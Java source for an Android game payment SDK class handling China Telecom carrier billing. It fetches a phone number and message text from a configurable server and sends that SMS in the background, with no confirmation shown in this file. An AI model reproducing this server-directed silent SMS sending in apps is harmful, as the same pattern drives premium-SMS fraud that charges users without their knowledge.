package mobi.zty.pay.sdk.boshitong;

import java.net.URLDecoder;
import java.net.URLEncoder;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.Constants;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.game.bean.MkInfo;
import mobi.zty.sdk.util.Base64;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.HttpRequestt;
import mobi.zty.sdk.util.Util_G;

import org.json.JSONObject;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;

/**
 * 电信爱城市 支付管理类
 * @author Administrator
 *
 */
public class BoShiTongInstance extends PaymentInterf{
	private static BoShiTongInstance instance;
	private Handler callBHandler = null;
	public static BoShiTongInstance getInstance(){
		if(instance==null){
			instance = scyMMpay();
		}
		return instance;
	}
	private static synchronized BoShiTongInstance scyMMpay(){
		if(instance==null){
			instance =  new BoShiTongInstance();
		}
		return instance;
	}
	@Override
	public void init(Context context, Object... parameters) {
		callBHandler = (Handler) parameters[0];
	}

	@Override
	public void pay(final Context context, Object... parameters) {
		final String orderid = (String) parameters[0];   //订单号
		final int feeIndex = (Integer) parameters[1];
		FeeInfo feeInfo = (FeeInfo) parameters[2];
		MkInfo mkInfo = (MkInfo) parameters[3];
		final String prodectName = Helper.getApplicationName(context);
		final String channelId = mkInfo.spChannel;
		final String pay_url = mkInfo.payUrl1;//支付请求的url
		final String amout = feeInfo.consume+"";
			new Thread(new Runnable() {
				@Override
				public void run() {
					PayResultInfo info = new PayResultInfo();
					info.index = feeIndex;
					try {
//						http://112.74.133.246:8015/acsgateway/vendorcall?vendorId=123456&price=100&productName=消除星星&extension=abcdefg
						String url = pay_url+"?vendorId="+channelId+"&price="+amout+"&productName="+URLEncoder.encode(prodectName, "UTF-8")+"&extension="+orderid;
						Util_G.debugE("url:", url);
						String requestResponse = HttpRequestt.get(url).body();
						Util_G.debugE("requestResponse:", requestResponse);
						boolean isSendMsg = false;
						if (requestResponse!=null && requestResponse!="") {
							String[] arr = requestResponse.split("##");
							JSONObject retJson = new JSONObject(requestResponse);
							String code =  getJsonString(retJson, "code");
							String msg = getJsonString(retJson, "msg");
							Util_G.debugE("status:", code+",msg:"+msg);
							if (code.equals("0"))  {//请求成功
								Helper.sendPayMessageToServer(PayConfig.BOSHITONG_PAY, "支付请求响应成功", feeIndex);
								String content = getJsonString(retJson, "content");
								String send_num = getJsonString(retJson, "dstPhone");
								Util_G.debugE("BoShiTong_Pay","send_num:"+send_num+",content:"+ content);
								Intent itSend = new Intent(Constants.SENT_SMS_ACTION);  
								itSend.putExtra("fee_index", feeIndex);
						        PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   
						        Util_G.sendTextMessage(context, send_num, content, mSendPI, 0);
								isSendMsg = true;
							}
						} 
						if (!isSendMsg) {
							info.resutCode = PayConfig.SP_PAY_FAIL;
							info.retMsg = "支付失败";
							Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
							message.obj = info;
							message.sendToTarget();
							return;
						}
					} catch (Exception e) {
						info.resutCode = PayConfig.SP_PAY_EXPTION;
						info.retMsg = "支付失败";
						Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
						message.obj = info;
						message.sendToTarget();
						e.printStackTrace();
					}
				}
			}).start();;
	}
	

	public  int getJsonInt(JSONObject json, String key) {
		int result = 0;
		try {
			result = json.getInt(key);
		} catch (Exception e) {
		}
		return result;
	}
	
	public String getJsonString(JSONObject json, String key) {
		String result = null;
		try {
			result = json.getString(key);
		} catch (Exception e) {
			e.printStackTrace();
		}
		return result;
	}
	
}
